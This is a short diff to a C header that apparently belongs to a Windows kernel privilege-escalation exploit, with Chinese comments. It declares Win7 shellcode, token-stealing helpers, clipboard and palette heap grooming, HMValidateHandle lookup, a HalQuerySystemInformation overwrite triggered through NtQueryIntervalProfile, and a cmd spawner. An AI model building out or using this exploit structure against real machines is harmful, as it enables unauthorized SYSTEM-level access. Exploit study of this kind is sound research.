@@ -38,12 +38,17 @@ typedef NTSTATUS(WINAPI* lpfnNtQueryIntervalProfile)(IN DWORD Src, IN OUT PDWORD
 
 EXTERN_C_START
 NTSTATUS ShellCodeInWin7();
+ULONG64 GetPEB();
 EXTERN_C_END
 
 VOID ShowError(char *str, DWORD dwErrorCode);			// 打印错误信息
+BOOL CreateCmd();
 ULONG64 GetNTBase();									// 获取ntos基址
 ULONG64 GetSystemProcess();								// 获取System进程EPROCESS
 BOOL CreateClipboard(DWORD dwSize);						// 通过剪切板实现垫片操作,dwSize + 0x14 + 0x10的内存块
 PVOID GetHMValidateHandle();							// 获取HMValidateHandle函数地址
 PVOID GetHalQuerySystemInformation();					// 获取HalQuerySystemInformation函数地址
 BOOL CallNtQueryIntervalProfile();						// 调用NtQueryIntervalProfile函数
+HPALETTE CreatePaletteBySize(DWORD dwSize);
+ULONG64 AllocateFreeWindow(DWORD dwMNSize);
+ULONG64 AllocateFreeWindows(DWORD dwSize);
